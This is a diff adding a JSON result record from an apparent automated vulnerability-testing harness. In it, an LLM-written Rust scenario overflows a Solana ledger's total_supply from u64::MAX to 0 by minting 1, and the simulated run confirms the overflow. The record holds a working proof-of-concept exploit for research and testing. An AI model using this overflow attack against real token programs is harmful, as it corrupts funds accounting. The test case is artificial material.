@@ -1,0 +1,70 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: total_supply wrapped to 0",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2198,
+        "completion_tokens": 649,
+        "latency_s": 3.87
+      },
+      "raw": "{\n  \"plan\": \"Inicializa a conta Ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chama mint com amount = 1, que usa wrapping_add e deve causar overflow silencioso, fazendo total_supply voltar a 0. O efeito medido é que total_supply após o ataque é 0 (ou menor que o valor inicial), demonstrando a vulnerabilidade de overflow.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\n// Conta ledger ainda não inicializada\\nlet ledger_account = empty_account();\\nlet authority_account = wallet(1_000_000_000);\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\n// Baseline: inicializa o ledger com total_supply = u64::MAX\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX,),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_program_id, false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (ledger_key, ledger_account),\\n    (authority, authority_account),\\n    (system_program_id, system_program_account),\\n];\\nlet init_result = env.baseline(\\\"initialize ledger with max supply\\\", &init_ix, &init_accounts);\\n\\n// Extrai a conta ledger resultante do baseline\\nlet ledger_after_init = after(&init_result, &ledger_key).clone();\\n\\n// Ataque: mint com amount = 1, causando overflow em total_supply\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(1u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"mint 1 causing overflow\\\", &mint_ix, &mint_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let ledger_data = after(&attack_result, &ledger_key).data();\\n    let total_supply = read_u64(ledger_data, 40); // offset: 8 discriminator + 32 authority\\n    env.effect(\\\"total_supply wrapped to 0\\\", total_supply == 0);\\n}\"\n}",
+      "plan": "Inicializa a conta Ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chama mint com amount = 1, que usa wrapping_add e deve causar overflow silencioso, fazendo total_supply voltar a 0. O efeito medido é que total_supply após o ataque é 0 (ou menor que o valor inicial), demonstrando a vulnerabilidade de overflow.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\n// Conta ledger ainda não inicializada\nlet ledger_account = empty_account();\nlet authority_account = wallet(1_000_000_000);\nlet (system_program_id, system_program_account) = system_program_account();\n\n// Baseline: inicializa o ledger com total_supply = u64::MAX\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX,),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_program_id, false),\n    ],\n);\nlet init_accounts = vec![\n    (ledger_key, ledger_account),\n    (authority, authority_account),\n    (system_program_id, system_program_account),\n];\nlet init_result = env.baseline(\"initialize ledger with max supply\", &init_ix, &init_accounts);\n\n// Extrai a conta ledger resultante do baseline\nlet ledger_after_init = after(&init_result, &ledger_key).clone();\n\n// Ataque: mint com amount = 1, causando overflow em total_supply\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(1u64,),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"mint 1 causing overflow\", &mint_ix, &mint_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let ledger_data = after(&attack_result, &ledger_key).data();\n    let total_supply = read_u64(ledger_data, 40); // offset: 8 discriminator + 32 authority\n    env.effect(\"total_supply wrapped to 0\", total_supply == 0);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with max supply",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "mint 1 causing overflow",
+            "result": "Success",
+            "compute_units": 2185,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "total_supply wrapped to 0",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2185 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: total_supply wrapped to 0"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Integer Overflow / Underflow."
+  }
+}
